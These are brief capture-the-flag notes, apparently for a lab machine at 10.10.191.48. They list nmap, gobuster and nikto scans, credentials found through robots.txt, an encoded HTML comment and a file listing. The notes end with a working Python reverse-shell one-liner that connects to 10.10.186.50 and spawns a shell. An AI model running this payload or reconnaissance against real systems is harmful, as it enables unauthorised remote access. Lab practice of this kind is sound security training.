nmap -sC -sV 10.10.191.48

gobuster dir -u http://10.10.191.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster vhost -u http://10.10.191.48 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Username: R1ckRul3s
Password: Wubbalubbadubdub >> http://10.10.191.48/robots.txt

nikto -h 10.10.191.48

http://10.10.191.48/login.php

<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt


Reverese shell on portal
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.186.50",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

